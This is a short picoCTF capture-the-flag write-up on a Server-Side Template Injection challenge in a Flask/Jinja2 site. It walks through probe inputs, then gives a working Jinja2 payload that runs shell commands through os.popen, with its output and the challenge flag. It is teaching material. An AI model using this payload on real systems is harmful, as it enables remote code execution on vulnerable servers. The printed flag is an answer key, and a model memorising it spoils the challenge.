## ğŸ‘‰ Challenge Overview:

**â— Category: Web Exploitation**\
**â— Difficulty: Easy**\
**â— Vulnerability: Server-Side Template Injection (SSTI)**

## ğŸ” Initial Reconnaissance:
When you visit the website, you see:

â— Title: "Home"\
â— Message: "I built a cool website that lets you announce whatever you want!*"\
â— Input field asking: "What do you want to announce:"\
â— Note at bottom: "*Announcements may only reach yourself"

This immediately suggests the input is being reflected back to you, making it a prime candidate for template injection.

## ğŸ‘‰ Step 1: Confirming SSTI Vulnerability
First, test with basic math expression:\
â— Input: {{7*7}}\
â— Output: 49 (vulnerable)\
So the application is processing template syntax.

## ğŸ‘‰ Step 2: Identifying the Template Engine
Since this syntax {{}} works, it's likely using Jinja2 (Python/Flask).\
â— Input: {{7*'7'}}\
â— Output: 7777777  # Confirms Jinja2

## ğŸš€ Step 3: Exploitation - Directory Listing
â— Input: {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}\
â— Output: __pycache__ app.py flag requirements.txt

## ğŸš© Flag:
â— Input: {{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}\
â— Output: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}

## â›“ï¸â€ğŸ’¥ Breaking down this payload:

â— config - Flask configuration object. (available in Jinja2 context)\
â— .__class__ - Gets the class of config object.\
â— .__init__ - Access the initializer method.\
â— .__globals__ - Access global namespace.\
â— ['os'] - Get the os module from globals.\
â— .popen('ls') - Execute the 'ls' command.\
â— .read() - Read the command output.

## ğŸ¤” Why This Works:
The vulnerability exists because:

â— User input is directly passed to render_template_string() without sanitization.\
â— No sandboxing is implemented.\
â— Jinja2 allows access to Python objects through its syntax.
